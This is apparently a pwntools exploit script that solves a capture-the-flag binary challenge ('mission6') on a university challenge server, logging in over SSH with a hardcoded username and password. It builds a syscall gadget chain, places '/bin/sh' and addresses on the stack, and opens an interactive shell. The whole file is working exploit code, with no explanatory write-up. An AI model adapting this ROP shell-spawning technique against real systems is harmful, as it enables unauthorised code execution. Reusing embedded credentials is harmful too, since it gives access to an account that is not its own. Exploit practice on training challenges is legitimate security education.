from pwn import *
from sys import *

SERVER = "bin.chall.necst.it"
PORT = 22
BINARY = "mission6"
REMOTE_BINARY = "/home/m226002/"+BINARY+"/"+BINARY
PASSWORD = "unixporn"
USER  = "m226002"


if "--remote" in sys.argv:
    s = ssh(user=USER, host=SERVER, port=PORT, password=PASSWORD)
    r = s.process(REMOTE_BINARY)
else:
    r = process(BINARY)

if "--debug" in sys.argv:
     
    gdb.attach(r, """
        #breakpoints
        unset environment
         b add_value
        # b get_present
        # b* 0x401064
        b* 0x040114c
        c
        """)
    input("wait")

#code 

# puts"1) RET");
# puts("2) POP RDI");
# puts("3) POP RSI");
# puts("4) POP RDX");
# puts("5) POP RBX");
# puts("6) SYSCALL");
# puts("7) POP RAX");
# puts("8) MOV ?,EAX");
# puts("9) MOV EAX,?");


timesleep = 0.5
binsh_addr = 0x7fffffffdf28 
gadget_addr = 0x0#0x7ffff7ff8000

def createGadget(list):
    global gadget_addr
    r.recv()
    if len(list)!=4:
        assert "gadget too long"
    
    r.sendline(b'3')
    sleep(timesleep)
    for x in list:
        r.sendline(str(x).encode())
        sleep(timesleep)
    
    r.recvuntil(b"Gadget created at ")
    x = r.recv(14).decode()
    gadget_addr = int(x, 16)
    print(hex(gadget_addr))



def addOnstackAddr(id, value):
    r.recvuntil(b"> ")
    r.sendline(b'1')
    sleep(timesleep)
    print(r.recvuntil(b"ID: "))
    r.sendline(str(id).encode())
    sleep(timesleep)
    x= r.recvuntil(b":")
    print(x)
    if x == b"Big endian:":
        value = invert_endianness(val=value)
    
    r.sendline(str(value).encode())
    sleep(timesleep)
    
def addOnstackBytes(id, value):
    r.recvuntil(b"> ")
    r.sendline(b'1')
    sleep(timesleep)
    print(r.recvuntil(b"ID: "))
    r.sendline(str(id).encode())
    sleep(timesleep)
    x= r.recvuntil(b":")
    print(x)
    if x == b"Big endian:":
        print("OK")
        val = int.from_bytes(value, byteorder='little')
        val = invert_endianness(val=val)
    else:
        val = int.from_bytes(value, byteorder='little')
    r.sendline(str(val).encode())
    sleep(timesleep)

def invert_endianness(val):
    new_val = 0
    for _ in range(8):
        new_val = (val & 0xff) | (new_val << 8)
        val >>= 8
    return new_val
    

createGadget([3, 7, 2, 6])
addOnstackBytes(0x1b, b"/bin/sh")
addOnstackBytes(0x2b, b"LOOL")
addOnstackAddr(0x02, gadget_addr)
addOnstackAddr(0x3b, binsh_addr)

r.sendline(b'4')

r.interactive()